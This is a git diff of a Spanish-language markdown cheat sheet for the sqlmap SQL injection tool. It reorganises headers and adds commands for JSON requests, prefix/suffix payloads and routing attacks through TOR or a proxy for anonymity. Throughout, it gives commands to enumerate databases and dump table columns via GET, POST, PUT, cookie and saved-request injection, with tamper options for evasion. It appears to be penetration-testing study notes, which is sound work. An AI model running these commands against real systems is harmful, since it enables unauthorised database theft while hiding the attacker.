@@ -26,7 +26,7 @@ sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln --dbs --tamper=space2commen
 #Cookie
 sqlmap -u "http://example.com/index.php" -v 3 --cookie "id=*" --dbs --tamper=space2comment
 #JSON
-
+sqlmap -r request.txt --batch --dbs
 ```
 ### Tabla
 - Devuelve las tablas de una DB específica
@@ -44,7 +44,7 @@ sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name --
 sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name  --dump -C name,name,name
 ```
 ---
-# Métodos HTTP: GET vs POST
+## Métodos HTTP: GET vs POST
 
 | **GET**                                                                                       | **POST**                                                                        |
 | --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
@@ -54,9 +54,9 @@ sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name  -
 | Solicitud limitada por la longitud máxima de la **URL.** Varía según el navegador y servidor. | No hay limitación de tamaño en los datos enviados en el cuerpo de la solicitud. |
 
 
-**EJEMPLO GET:** `http://www.example.com/index.php?username=user&password=pass123`
+- **EJEMPLO GET:** `http://www.example.com/index.php?username=user&password=pass123`
 
-**EJEMPLO POST:** 
+- **EJEMPLO POST:** 
 ```http
 POST /login HTTP/1.1
 Host: www.example.com
@@ -64,26 +64,26 @@ Content-Type: application/x-www-form-urlencoded
 
 username=user&password=pass123
 ```
-## GET Request con SQLMap:
+#### **GET Request con SQLMap**
 
 - Se analiza **user=admin** y **pass=admin** en la **URL** para detectar posibles inyecciones **SQL**.
 ```bash
 sqlmap -u http://www.example.com/login.php?user=admin&pass=admin
 ```
-## POST Request con SQLMap:
+#### **POST Request con SQLMap**
 
 - Se analiza  **user=admin** y **pass=admin** en el **cuerpo** de la solicitud para detectar posible SQLi.
 ```bash
 sqlmap -u http://www.example.com/login.php --data='user=admin&pass=admin'
 ```
-## PUT Request con SQLMap:
+#### **PUT Request con SQLMap**
 
 - PUT, envía datos al servidor para crear o actualizar un recurso en el servidor.
 - Se permite verificar si la aplicación web es susceptible a `SQLi` con un método diferente a los que son `POST` y `GET`.
 ```bash
 sqlmap -u www.example.com --data='id=1' --method PUT
 ```
-## Solicitud HTTP con SQLMap
+#### **Solicitud HTTP con SQLMap**
 
 - Se puede guardar la cabecera desde BurpSuite en un **.txt** y luego alojarla en la herramienta de SQLMap junto el comando **-r**.
 1. Lanzar la petición.
@@ -94,7 +94,7 @@ sqlmap -u www.example.com --data='id=1' --method PUT
 ```bash
 sqlmap -r request.txt /rq.txt
 ```
-## Cookies con SQLMap
+#### **Cookies con SQLMap**
 
 - Especificar el valor de la cookie con SQLMap.
 ```bash
@@ -108,7 +108,7 @@ sqlmap ... -H='Cookie:PHPSESSID=..'
 ```bash
 sqlmap -u http://example.com/index.php --cookie="id=*" --dbs --batch
 ```
-## JSON con SQLMap
+#### **JSON con SQLMap**
 
 - Capturar la trama, agregar el **JSON** y por último cambiar el método **GET** por **POST**.
 - Copiar la trama con las modificaciones realizadas y pegarlas en un archivo **.txt**
@@ -120,28 +120,34 @@ sqlmap -u http://example.com/index.php --cookie="id=*" --dbs --batch
 sqlmap -r request.txt --batch --dbs
 # Por último seguir el paso a paso del principio para revisar tablas, columnas y datos.
 ```
+
+#### **Valor Prefijo y Sufijo**
+- Opciones `--prefix` y `--suffix`
+```bash
+sqlmap -u http://example.com?id=test --prefix="%'))" --suffix="-- -"
+```
 ---
-## Almacenar la salida
+### "Anonimato"
+
+#### Usar TOR con SQLMap
+```bash
+sqlmap -u 'http://www.example.com' --tor --tor-type=SOCK5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
+```
+#### Usar un PROXY con SQLMap
+```bash
+sqlmap -u 'http://www.example.com' --proxy='https://127.0.0.1:8080'
+```
+### Almacenar la salida
 - **BurpSuite**:
 <p align="center">
   <img src="https://i.postimg.cc/KvnMdscF/sqli-txt.png" alt="sqli"/>
 </p>
 
 - **SQLMap:**
-
+	- `-t` lo exporta el contenido de la cabecera hacia el archivo **request.txt**
 ```bash
 sqlmap -u http://example.com?id=1 --batch -t /tmp/request.txt
 cat /tmp/request.txt
 ```
 
 ---
-# "Anonimato"
-
-## Usar TOR con SQLMap
-```bash
-sqlmap -u 'http://www.example.com' --tor --tor-type=SOCK5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
-```
-## Usar un PROXY con SQLMap
-```bash
-sqlmap -u 'http://www.example.com' --proxy='https://127.0.0.1:8080'
-```
